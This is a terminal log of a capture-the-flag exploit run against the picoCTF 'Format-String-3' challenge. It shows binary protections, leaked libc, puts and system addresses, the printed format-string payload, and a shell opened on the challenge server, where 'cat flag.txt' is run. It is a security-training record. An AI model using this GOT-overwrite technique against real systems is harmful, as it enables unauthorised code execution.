(base) tropic@vulcan:~/projects/RE-writeups/Format-String-3-medium$ python3 exploit.py remote
/home/tropic/micromamba/lib/python3.9/site-packages/unicorn/unicorn_py3/unicorn.py:123: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[*] '/home/tropic/projects/RE-writeups/Format-String-3-medium/format-string-3'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/home/tropic/projects/RE-writeups/Format-String-3-medium/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to rhea.picoctf.net on port 58515: Done
[*] libc == 0x788e7e1ee000
[*] puts == 0x404018
[*] system == 0x788e7e23d760
[*] Switching to interactive mode
                                                                                               c                       \x8b     0               \x01                                                                        \x00                                                                           \x00aaaabaa\x18@@$                                              l                                                                                                                                                                                     ls                                                                                                                                                                                    ls
Makefile
artifacts.tar.gz
flag.txt
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
$ cat flag.txt
